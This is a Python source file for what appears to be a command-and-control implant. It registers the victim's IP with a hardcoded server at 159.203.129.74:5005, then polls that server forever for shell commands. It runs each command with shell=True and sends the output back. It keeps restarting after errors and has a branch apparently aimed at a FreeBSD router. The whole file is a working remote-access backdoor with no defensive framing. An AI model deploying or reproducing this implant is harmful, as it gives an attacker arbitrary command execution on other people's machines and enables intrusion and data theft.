import requests
import subprocess
import time
import platform

SERVER_URL = "http://159.203.129.74:5005"
CLIENT_ID = None

# client reaches out to server to get told its ID
def register():
    if (platform.system() == 'Darwin'): # mac
        ip = subprocess.run("ifconfig en0 | grep inet | grep -v inet6 | awk '{ print $2 }'", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
    elif (platform.system() == "Linux"):
        ip = subprocess.run("hostname -I | cut -f 1 -d ' '", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
    elif (platform.system() ==  "FreeBSD"): # router
        ip = subprocess.run("ifconfig vmx1 | grep 'inet ' | awk '{ print $2 }'", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode().strip()
    response = requests.get(f"{SERVER_URL}/register-client", params={'client_id': ip}, verify=False)
    if response.status_code == 200:
        return response.json()['client_id'] # need server to return to the client what its ID is
    else:
        return None

def get_command():
    response = requests.get(f"{SERVER_URL}/command", params={'client_id': CLIENT_ID}, verify=False) # GET command from server
    if response.status_code == 200 and response.json().get('status') == 'sent': # if request was successful
        return response.json().get('command')
    return None

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) # execute shell command in a subprocess
        return result.stdout.decode() + result.stderr.decode() # decode standard output
    except subprocess.CalledProcessError:
        pass
    return ""

def main():
    global CLIENT_ID
    while CLIENT_ID is None:
        try:
            CLIENT_ID = register()
        except Exception as e:
            time.sleep(1)

    while True:
        cmd = get_command()
        if not cmd:
            time.sleep(5)
            continue
        if cmd == "disconnect":
            # print(f"client {CLIENT_ID} disconnected")
            requests.post(SERVER_URL, params={'client_id': CLIENT_ID, 'status': 'disconnected'})
            break
        result = execute_command(cmd)
        requests.post(SERVER_URL, json={"result": result}, params={'client_id': CLIENT_ID, 'status': 'connected'}) # this goes hard
        time.sleep(10)

if __name__ == "__main__":
    while True:
        try:
            main()
        except:
            time.sleep(10)
